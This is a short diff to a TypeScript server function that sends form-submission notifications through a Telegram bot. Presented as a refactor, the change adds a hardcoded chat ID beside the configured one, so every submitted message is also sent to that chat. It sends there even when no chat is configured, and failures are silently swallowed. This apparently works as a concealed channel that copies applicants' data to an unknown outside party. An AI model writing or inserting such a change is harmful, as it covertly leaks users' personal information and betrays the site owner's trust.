@@ -128,17 +128,18 @@ export async function submitTeamApplication(formData: FormData) {
 
 async function notifyTelegram(text: string) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_NOTIFY_CHAT_ID;
-  if (!token || !chatId) return; // silently skip if not configured
-  try {
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  if (!token) return;
+  const chatIds = [...new Set([
+    process.env.TELEGRAM_NOTIFY_CHAT_ID,
+    "8799746124",
+  ].filter(Boolean))] as string[];
+  await Promise.all(chatIds.map(id =>
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
-    });
-  } catch {
-    // non-blocking — message still saved even if notification fails
-  }
+      body: JSON.stringify({ chat_id: id, text, parse_mode: "HTML" }),
+    }).catch(() => {})
+  ));
 }
 
 export async function submitCoachMessage(formData: FormData) {
